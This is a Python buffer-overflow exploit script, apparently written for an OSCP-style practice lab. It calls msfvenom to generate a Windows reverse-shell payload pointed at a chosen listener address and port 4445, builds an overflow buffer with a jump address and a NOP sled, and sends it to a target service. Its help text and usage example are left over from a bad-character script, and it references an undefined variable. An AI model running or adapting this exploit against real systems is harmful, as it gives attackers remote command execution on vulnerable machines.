#!/usr/bin/python3
import socket, subprocess, sys, traceback, os
import argparse
import subprocess

"""
##############################################################

	exploit the bof. automatically create reverse shell 
	payload and send to target

##############################################################
"""

# reverse shell port
rsh_port = 4445


# setup arg parser
parser = argparse.ArgumentParser(description="find bad chars",epilog="use EIP location and bad char bytearray to determine what cannot be used for the shellcode")
parser.add_argument('-s', dest='server', type=str, help='server IP')
parser.add_argument('-p', dest='port', type=int, help='service port')
parser.add_argument('-c', dest='prefix', type=str, help='prefix / command')
parser.add_argument('-l', dest='length', type=int, help='crash buffer length')
parser.add_argument('-o', dest='offset', type=int, help='EIP offset')
parser.add_argument('-b', dest='badchars', type=str,default="", help='bad chars')
parser.add_argument('-j', dest='jumppoint', type=str,help='jump point')
parser.add_argument('-r', dest='rsh_ip', type=str, help='reverse shell target')


# print extended help, when no args are provided
if len(sys.argv)==1:
    parser.print_help(sys.stderr)
    print("Example use: ")
    print("\n\t./2-find-bad-chars.py -s 10.10.52.232 -p 1337 -l 2000 -c OVERFLOW1 -o 1978 -b \"\\x00\\x07\\x2e\\xa0\"\n")
    sys.exit(1)
args = parser.parse_args()


# init vars / set input
ip = args.server
port = args.port
prefix = args.prefix + " "
buflen = str( args.length + 400)


# set jump location, add zero byte, if jump loc is odd 
# numbered, and reverse the ptr val bc of endianness
jump = args.jumppoint
jump = jump if len(jump)%2==0 else "0"+jump
jump = [jump[i:i+2] for i in range(0, len(jump), 2)]
jump.reverse()
jump = "".join(jump)
jumpx = bytearray.fromhex(jump)


# put together the payload
offset = args.offset
retn = jumpx
overflow = "A" * offset + "A" * ((len(prefix)+len(retn)+offset)%4)
padding = bytearray.fromhex("90" * 16)


# start msfvenom with parameters determined by input args and
# write output to file for documentation purposes
rsh_name = "_".join(["rsh", ip, str(port), prefix, str(offset), "bc", args.badchars.replace("\\x","-"), jump, args.rsh_ip, str(rsh_port), ".py"]) 
if not os.path.isfile(rsh_name):
    subprocess.call(["msfvenom", "-p", "windows/shell_reverse_tcp", f"LHOST={args.rsh_ip}", f"LPORT={rsh_port}", "EXITFUNC=thread", "-b", args.badchars, "-f", "py","-o", rsh_name])


# read output of msfvenom from file 
with open(rsh_name,"r") as f:
    fread =f.read()
fread = fread.replace("buf += b\"","").replace("buf =  b\"","")
fread = fread.replace("\"","").replace("\n","")
fread = bytearray.fromhex(fread.replace("\\x",""))
print(fread)


# set together the payload
payload =fread
postfix = ""

buffer = (prefix + overflow ).encode() + retn + padding + payload + postfix.encode()


# send the exploit
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
print("\n\n#######################\n")
print("Status:")
try:
    s.connect((ip, port))
    print("Sending evil buffer...")
    s.send(buffer + ("\r\n").encode())
    print("Done!")
except Exception as e:
    traceback.print_exc()
    print(e)
    print("Could not connect.")
printbadchars ="\\x" +  "\\x".join(badchars)


# print help
print("#########################i\n")
print(f"\t1. execute the script with offset (-o) specified but without any bad bytes (-b)")
print(f"\t2. execute the following command in IMMUNITY and specify the value of ESP as the address")
print(f"\n\t\t!mona compare -f C:\mona\oscp\\bytearray.bin -a <address>")
print(f"\n\t3. Get the bad bytes from MONA output and create a new MONA bad bytes array")
print(f"\n\t\t!mona bytearray -b \"{printbadchars}\"")
print(f"\n\t4. restart this script with the additional bad bytes (-b option)")
print(f"\t5. repeat 3. and 4. until nothing changes. Remember that with consecutive bad bytes the first can flip the folllowing byte.")
print("#########################i\n")
print(f"\nFind jump point:\n\n\t!mona jmp -r esp -cpb \"{printbadchars}\"")

